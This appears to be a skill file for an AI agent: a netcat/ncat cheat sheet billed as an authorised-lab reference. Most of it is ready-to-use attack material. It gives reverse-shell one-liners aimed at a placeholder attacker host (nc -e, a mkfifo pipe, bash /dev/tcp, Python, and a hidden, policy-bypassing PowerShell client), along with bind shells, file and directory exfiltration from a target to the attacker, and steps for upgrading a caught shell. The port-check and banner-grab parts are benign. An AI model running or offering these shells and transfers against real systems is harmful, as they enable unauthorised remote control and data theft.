---
name: netcat
description: "Auth/lab ref: Netcat (nc/ncat): TCP/UDP Swiss Army knife for callback-shell lab, bind-shell lab, port checks, banner grabbing, file transfer, port forwarding, and listener setup."
license: GPL-2.0
compatibility: "Linux, macOS, Windows; Pre-installed on Linux/macOS; Windows: use ncat (from nmap package) or nc64.exe."
metadata:
  author: AeonDave
  version: "1.0"
---

# Netcat / ncat

TCP/UDP utility — shells, file transfer, port probing, port forwarding.

## Quick Start

```bash
# Listener (catch reverse shell)
nc -lvnp 4444

# Connect to port (test connectivity / banner grab)
nc -nv 10.10.10.10 80

# Reverse shell (from target)
nc -e /bin/bash <attacker_ip> 4444
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-l` | Listen mode |
| `-v` | Verbose |
| `-n` | No DNS resolution |
| `-p <port>` | Local port |
| `-e <cmd>` | Execute command on connect |
| `-u` | UDP mode |
| `-w <sec>` | Timeout |
| `-z` | Zero I/O mode (port scan) |
| `-k` | Keep listening after client disconnects (ncat) |
| `--ssl` | SSL/TLS (ncat only) |

## Reverse Shells

```bash
# From Linux target (nc with -e)
nc -e /bin/bash <attacker> 4444

# From Linux target (nc without -e / busybox)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker> 4444 > /tmp/f

# From Windows target (ncat)
ncat -e cmd.exe <attacker> 4444
ncat -e powershell.exe <attacker> 4444

# Bash (no nc needed)
bash -i >& /dev/tcp/<attacker>/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('<attacker>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Bind Shell (target listens, attacker connects)

```bash
# Target listens
nc -lvnp 4444 -e /bin/bash          # Linux
ncat -lvnp 4444 -e cmd.exe          # Windows

# Attacker connects
nc -nv <target_ip> 4444
```

## Banner Grabbing / Port Check

```bash
# Banner grab
nc -nv 10.10.10.10 22
nc -nv 10.10.10.10 80

# Send HTTP request
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -nv 10.10.10.10 80

# Quick port check (z flag)
nc -z -nv 10.10.10.10 22
nc -z -nv 10.10.10.10 1-1000      # port scan (slow; use nmap instead)
```

## File Transfer

```bash
# Receiver (attacker)
nc -lvnp 9999 > received_file

# Sender (target)
nc -nv <attacker> 9999 < file_to_send

# Directory (tar pipe)
# Receiver
nc -lvnp 9999 | tar xvf -

# Sender
tar cvf - /path/to/dir | nc -nv <attacker> 9999
```

## Port Forwarding (ncat)

```bash
# Forward local 8080 → remote 80
ncat -lvnp 8080 --sh-exec "ncat 10.10.10.10 80"

# Relay (ncat broker)
ncat -lvnp 4444 --broker
```

## Shell Upgrade (after catching nc shell)

```bash
# On target (in nc shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background: Ctrl+Z
stty raw -echo; fg

# Set terminal size
export TERM=xterm
stty rows 40 cols 160
```

## Resources

| File | When to load |
|------|--------------|
| `references/shells.md` | Full reverse shell one-liners for all languages, shell upgrade steps, Windows shells |
